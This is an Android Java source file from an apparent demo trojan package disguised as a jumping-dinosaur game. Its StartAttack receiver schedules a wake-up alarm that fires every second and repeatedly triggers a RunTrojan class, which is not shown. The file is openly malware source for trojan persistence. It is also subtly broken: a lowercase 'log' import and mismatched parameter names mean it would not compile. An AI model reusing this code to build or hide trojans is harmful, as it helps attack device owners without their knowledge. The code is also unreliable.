package demo.jumpingdinosaur.apk.trojan;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.log;

import java.util.Calendar;

public class StartAttack extends BroadcastReceiver {
	int count = 0;
	Calendar cal = Calendar.getInstance();
	long TIME = 1000;

	@Override
	public void onReceive(Context content, Intent Intent) {
		Log.i("StartAttack", "onReceive");
		AlarmManager service = (AlarmManager)context.getSystemService(Context.ALARM_SERVICE);
		Intent i = new Intent(context, RunTrojan.class);
		i.setAction("demo.jumpingdinosaur.action.BC_ACTION");
		PendingIntent pending = PendingIntent.getBroadcast(context, 0, i, PendingIntent.FLAG_CANCEL_CURRENT);
		service.setInexactRepeating(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(), TIME, pending);
		Log.i("StartAttack", count++ +" times");
	}
}